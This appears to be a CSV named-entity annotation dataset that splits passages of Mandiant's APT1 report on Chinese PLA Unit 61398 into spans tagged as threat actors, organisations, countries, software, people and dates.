DocName,text,intent
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," indicators, such as domain names, IP addresses, and MD5 hashes of 
malware.

»− Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s 
arsenal of digital weapons. 

»− Thirteen (13) X.509 encryption certificates used by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,".

»− A compilation of videos showing actual attacker sessions and their intrusion activities.

»» While existing customers of ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s enterprise-level products, ",O
Mandiant_APT1_Report,Mandiant Managed Defense,software
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Mandiant Intelligent Response,software
Mandiant_APT1_Report,"®, have had prior access to these ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Indicators, we are also making them available for use 
with ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,"™, our free host-based investigative tool. ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," can be downloaded at http://www.mandiant.com/
resources/download/redline.

http://www.mandiant.com/products/mcirt-managed-defense/
http://www.mandiant.com/products/platform/
http://www.mandiant.com/products/platform/
http://www.mandiant.com/resources/download/redline
http://www.mandiant.com/resources/download/redline


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 6 www.mandiant.com

Conclusion

The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified 
group based in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, leaves little doubt about the organization behind ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". We believe the totality of the evidence 
we provide in this document bolsters the claim that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, is ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,". However, we admit there is one other unlikely 
possibility:

A secret, resourced organization full of mainland Chinese speakers with direct access to ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"-based 
",O
Mandiant_APT1_Report,telecommunications,industry
Mandiant_APT1_Report," infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign 
right outside of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s gates, performing tasks similar to ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s known mission.

Why We Are Exposing ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 

The decision to publish a significant part of our intelligence about ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," was a painstaking one. What started as 
a “what if” discussion about our traditional non-disclosure policy quickly turned into the realization that the positive 
impact resulting from our decision to expose ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," outweighed the risk to our ability to collect intelligence on this 
particular ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, group. It is time to acknowledge the threat is originating in ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,", and we wanted to do our part to arm 
and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing 
link in publicly understanding the landscape of ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, cyber espionage. Without establishing a solid connection to ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,", 
there will always be room for observers to dismiss ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," actions as uncoordinated, solely criminal in nature, or peripheral 
to larger national security and global economic concerns. We hope that this report will lead to increased understanding 
and coordinated action in countering ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," network breaches.

At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and 
technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, 
publishing certain kinds of indicators dramatically shortens their lifespan. When ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," changes their techniques 
after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It 
is our sincere hope, however, that this report can temporarily increase the costs of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s operations and impede 
their progress in a meaningful way.

We are acutely aware of the risk this report poses for us. We expect reprisals from ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," as well as an onslaught of 
criticism. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 7 www.mandiant.com

",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s CoMPuter network 
oPeratIons taskInG to ",O
Mandiant_APT1_Report,PLa unIt 61398,threat_actor
Mandiant_APT1_Report," (61398部队 )

Our research and observations indicate that ",O
Mandiant_APT1_Report,the Communist Party,org
Mandiant_APT1_Report," of  
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,",中国共产党) is tasking the ",O
Mandiant_APT1_Report,Chinese People’s Liberation Army,org
Mandiant_APT1_Report,"  
(",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,",中国人民解放军) to commit systematic cyber espionage and data theft 
against organizations around the world. This section provides photos and details 
of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," facilities, Chinese references discussing the unit’s training and 
coursework requirements, and internal Chinese communications documenting 
the nature of the unit’s relationship with at least one state-owned enterprise. 
These details will be particularly relevant when we discuss ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s expertise, 
personnel, location, and infrastructure, which parallel those of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,".

",O
Mandiant_APT1_Report,the Communist Party,org
Mandiant_APT1_Report, of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"

The ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s cyber command is fully institutionalized within the ,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report, and able to draw upon the resources of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s state-
owned enterprises to support its operations. The ",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report, is the ultimate authority in Mainland ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"; unlike in Western 
societies, in which political parties are subordinate to the government, the military and government in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," are 
subordinate to the ",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,". In fact, the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, reports directly to the ,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,Central Military Commission,org
Mandiant_APT1_Report," (CMC, 中央军事委
员会).6 This means that any enterprise cyber espionage campaign within the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report," is occurring at the direction of senior 
members of the ",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,".

We believe that the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s strategic cyber command is situated in the ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,",总参谋
部), specifically its 3rd Department (总参三部).7 The ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report, is the most senior ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, department. Similar to the ,O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," 
",O
Mandiant_APT1_Report,Joint Chiefs of Staff,org
Mandiant_APT1_Report,", the ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report, establishes doctrine and provides operational guidance for the ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,. Within the ,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,", the 
3rd Department has a combined focus on signals intelligence, foreign language proficiency, and defense information 

6 ",O
Mandiant_APT1_Report,James C. Mulvenon,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Andrew N. D. Yang,identity
Mandiant_APT1_Report,", editors, ",O
Mandiant_APT1_Report,The People’s Liberation Army,org
Mandiant_APT1_Report," as Organization: Reference Volume v1.0, (",O
Mandiant_APT1_Report,Santa Monica,city
Mandiant_APT1_Report,", CA: ",O
Mandiant_APT1_Report,RAND Corporation,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,2002,timestamp
Mandiant_APT1_Report,"), 96, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
7 ",O
Mandiant_APT1_Report,Bryan Krekel,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Patton Adams,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,George Bakos,identity
Mandiant_APT1_Report,", “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations 
and Cyber Espionage,” Prepared for the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report,-,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, Economic and Security Review Commission by ,O
Mandiant_APT1_Report,Northrop Grumman Corp,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"): 10, http://www.
uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 8 www.mandiant.com

systems.8 It is estimated to have 130,0009 personnel divided between 12 bureaus (局), three research institutes, and 
16 regional and functional bureaus.10 We believe that the ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department, 2nd Bureau (总参三部二局), is the 
",O
Mandiant_APT1_Report,APT group,threat_actor
Mandiant_APT1_Report, that we are tracking as ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". Figure 1 shows how close the 2nd Bureau sits to the highest levels of the 
",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,". At this level, the 2nd Bureau also sits atop a large-scale organization of subordinate offices.

",O
Mandiant_APT1_Report,Communist Party,org
Mandiant_APT1_Report, of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
(",O
Mandiant_APT1_Report,Central Military Commission,org
Mandiant_APT1_Report,",

)

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Political Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Logistics Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Armaments Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 1st Department 
( )
Operations

",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 2nd Department
( )
Intelligence

",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department
( )

",O
Mandiant_APT1_Report,SIGINT,org
Mandiant_APT1_Report,/,O
Mandiant_APT1_Report,CNO,org
Mandiant_APT1_Report,"

7 Military Regions
",O
Mandiant_APT1_Report,PLA Airforce,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLAA,org
Mandiant_APT1_Report,")
",O
Mandiant_APT1_Report,PLA Navy,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLAN,org
Mandiant_APT1_Report,")

1st Bureau
(总参三部一局)

2nd Bureau
(总参三部二局)

",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"

12 Total Bureaus
3 Research Institutes

FIGure 1: ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,’s position within the ,O
Mandiant_APT1_Report,PLa11,org
Mandiant_APT1_Report," 

8 The 3rd department’s mission is roughly a blend of the missions assigned to the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,National Security Agency,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,the Defense Language Institute,org
Mandiant_APT1_Report,", 
and parts of ",O
Mandiant_APT1_Report,the Defense Information Systems Agency,org
Mandiant_APT1_Report,".
9 ",O
Mandiant_APT1_Report,Bryan Krekel,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Patton Adams,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,George Bakos,identity
Mandiant_APT1_Report,", “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations 
and Cyber Espionage,” Prepared for the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report,-,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, Economic and Security Review Commission by ,O
Mandiant_APT1_Report,Northrop Grumman Corp,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"): 47, http://www.
uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
10 ",O
Mandiant_APT1_Report,Ian Easton,identity
